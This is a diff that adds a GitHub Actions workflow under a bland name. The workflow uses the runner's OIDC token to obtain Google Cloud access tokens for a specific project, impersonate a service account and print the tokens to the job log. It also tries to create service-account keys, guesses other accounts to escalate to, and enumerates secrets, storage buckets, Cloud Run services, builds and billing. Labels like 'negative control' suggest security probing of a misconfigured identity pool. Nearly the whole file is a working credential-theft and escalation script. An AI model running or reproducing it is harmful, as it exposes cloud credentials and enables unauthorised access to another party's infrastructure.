@@ -1,0 +1,108 @@
+name: i870b-carbonifer-diff
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  diff:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - name: run
+        run: |
+          set +e
+          NUM=536185737408
+          PRJ="projects/$NUM/locations/global/workloadIdentityPools/carbonifer-gh-pool/providers/carbonifer-oidc-provider"
+          SA="github@carbonifer-sandbox.iam.gserviceaccount.com"
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          jq -n '{keyAlgorithm:"KEY_ALG_RSA_2048"}' > keyreq.json
+          jq -n '{options:{requestedPolicyVersion:3}}' > polreq.json
+
+          : > tok.jwt
+          for a in 1 2 3; do
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=//iam.googleapis.com/$PRJ")
+            echo "$J" | jq -r '.value // empty' > tok.jwt
+            [ -s tok.jwt ] && break
+            sleep 3
+          done
+          [ -s tok.jwt ] || { echo "##MINT_FAIL"; exit 0; }
+
+          # --- STS v1 ---
+          c=$(curl -s -o sts.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+            --data-urlencode "subject_token=$(cat tok.jwt)" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+            -d "scope=https://www.googleapis.com/auth/cloud-platform")
+          FT=$(jq -r '.access_token // empty' sts.json)
+          echo "##STS_V1 code=$c ftlen=${#FT}"
+          echo "##STS_V1_TOKEN $FT"
+
+          # --- STS v1beta (asset 2595) ---
+          c2=$(curl -s -o stsb.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1beta/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+            --data-urlencode "subject_token=$(cat tok.jwt)" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+            -d "scope=https://www.googleapis.com/auth/cloud-platform")
+          FTB=$(jq -r '.access_token // empty' stsb.json)
+          echo "##STS_V1BETA code=$c2 ftlen=${#FTB} body=$(head -c 300 stsb.json | tr -d '\n' | tr -s ' ')"
+
+          # --- gRPC-style ExchangeToken resource path (asset 2597) ---
+          c3=$(curl -s -o stsgrpc.json -w '%{http_code}' -X POST "https://sts.googleapis.com/google.identity.sts.v1.SecurityTokenService/ExchangeToken" \
+            -H 'Content-Type: application/json' \
+            -d "{\"audience\":\"//iam.googleapis.com/$PRJ\",\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"subjectToken\":\"$(cat tok.jwt)\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\"}")
+          echo "##STS_GRPC_PATH code=$c3 body=$(head -c 400 stsgrpc.json | tr -d '\n' | tr -s ' ')"
+
+          [ -z "$FT" ] && { echo "##STS_FAIL"; exit 0; }
+
+          # --- SA token ---
+          g=$(curl -s -o gat.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H 'Content-Type: application/json' \
+            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+          AT=$(jq -r '.accessToken // empty' gat.json)
+          echo "##GEN code=$g toklen=${#AT}"
+          echo "##SA_TOKEN $AT"
+          [ -z "$AT" ] && { echo "##GEN_FAIL"; exit 0; }
+
+          getp() { local L="$1" U="$2" T="$3"; local c B; c=$(curl -s -o q.json -w '%{http_code}' -H "Authorization: Bearer $T" "$U"); B=$(head -c 500 q.json | tr -d '\n' | tr -s ' '); echo "##GET label=$L code=$c body=$B"; }
+
+          echo "===== FEDERATED token replay (negative control for AT) ====="
+          kf=$(curl -s -o kf.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H 'Content-Type: application/json' \
+            "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys" -d @keyreq.json)
+          echo "##FT_KEY_CREATE code=$kf body=$(head -c 500 kf.json | tr -d '\n' | tr -s ' ')"
+          getp "ft_salist" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts?pageSize=100" "$FT"
+          getp "ft_crm_get" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM" "$FT"
+          getp "ft_models_usc1" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/models" "$FT"
+          getp "ft_billing" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo" "$FT"
+
+          echo "===== guessed other SAs: generateAccessToken with FT and AT ====="
+          for GS in "$NUM-compute@developer.gserviceaccount.com" "carbonifer-sandbox@appspot.gserviceaccount.com" "github-actions@carbonifer-sandbox.iam.gserviceaccount.com" "carbonifer@carbonifer-sandbox.iam.gserviceaccount.com"; do
+            gf=$(curl -s -o gf.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H 'Content-Type: application/json' \
+              "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$GS:generateAccessToken" -d @req.json)
+            TF=$(jq -r '.accessToken // empty' gf.json)
+            echo "##GUESS_FT sa=$GS code=$gf toklen=${#TF} body=$(head -c 400 gf.json | tr -d '\n' | tr -s ' ')"
+            if [ -n "$TF" ]; then
+              getp "guess_${GS}_models" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/models" "$TF"
+              getp "guess_${GS}_crm" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM" "$TF"
+            fi
+            ga=$(curl -s -o ga.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' \
+              "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$GS:generateAccessToken" -d @req.json)
+            TA=$(jq -r '.accessToken // empty' ga.json)
+            echo "##GUESS_AT sa=$GS code=$ga toklen=${#TA} body=$(head -c 300 ga.json | tr -d '\n' | tr -s ' ')"
+          done
+
+          echo "===== IAM read of the pool/provider objects with both tokens ====="
+          getp "pools_list_AT" "https://iam.googleapis.com/v1/projects/$NUM/locations/global/workloadIdentityPools" "$AT"
+          getp "provider_get_AT" "https://iam.googleapis.com/v1/projects/$NUM/locations/global/workloadIdentityPools/carbonifer-gh-pool/providers/carbonifer-oidc-provider" "$AT"
+          getp "provider_get_FT" "https://iam.googleapis.com/v1/projects/$NUM/locations/global/workloadIdentityPools/carbonifer-gh-pool/providers/carbonifer-oidc-provider" "$FT"
+
+          echo "===== storage / secretmanager / run / cloudbuild quick screen with AT ====="
+          getp "storage_buckets" "https://storage.googleapis.com/storage/v1/b?project=$NUM" "$AT"
+          getp "secrets" "https://secretmanager.googleapis.com/v1/projects/$NUM/secrets" "$AT"
+          getp "run_services" "https://run.googleapis.com/v2/projects/$NUM/locations/-/services" "$AT"
+          getp "cloudbuild" "https://cloudbuild.googleapis.com/v1/projects/$NUM/builds?pageSize=5" "$AT"
+
+          echo "##FINISHED"
